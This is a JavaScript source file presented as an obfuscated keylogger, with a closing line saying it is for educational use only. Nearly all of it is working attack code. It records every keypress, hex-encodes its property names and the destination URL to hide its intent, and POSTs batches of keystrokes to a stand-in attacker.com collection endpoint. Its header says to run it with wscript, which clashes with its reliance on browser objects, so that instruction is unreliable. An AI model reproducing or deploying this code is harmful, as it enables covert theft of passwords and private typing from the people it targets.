// Created July 6, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows with [ wscript <path to file>\JavaScript_Keylogger_Obfuscated.js ]


// A simpler JS Keylogger (no DNS exfiltration or encryption), but shown as an obfuscated example.
// This time we've converted as much as possible to hex to hide the intent of the program

// Tnitialize an array to store  the collected keystrokes
var f5b6h8 = [];

// An event listener for any keypresses
document["\x6F\x6E\x6B\x65\x79\x64\x6F\x77\x6E"] = function(e) {
    // Now we convert the keyse to a hex character and store them
    f5b6h8["\x70\x75\x73\x68"](String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](e["\x6B\x65\x79\x43\x6F\x64\x65"]));

    // Once we've logged enough keys (50, since we're not Chunking them into groups of 10), we send them
    if (f5b6h8["\x6C\x65\x6E\x67\x74\x68"] > 50) {
        // Send the keylogs
        i9n7t(f5b6h8);
        // Reset the keylog array to empty so we can begin collecting them again
        f5b6h8 = [];
    }
};

function i9n7t(j4a6c) {
    // Now create a new exfiltration request (via POST as an XMLHttpRequest object)
    var xhr = new (window["\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74"])();
    // Set up the request
    xhr["\x6F\x70\x65\x6E"]("\x50\x4F\x53\x54", "\x68\x74\x74\x70\x3A\x2F\x2F\x61\x74\x74\x61\x63\x6B\x65\x72\x2E\x63\x6F\x6D\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x2E\x70\x68\x70", true);
    xhr["\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72"]("\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64");
    // We convert the keylog array to a string
    var data = "\x6B\x3D" + j4a6c["\x6A\x6F\x69\x6E"]("\x2C");
    // Finally we send the data via POST request using the same XMLHttpRequest object technique
    xhr["\x73\x65\x6E\x64"](data);
}

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
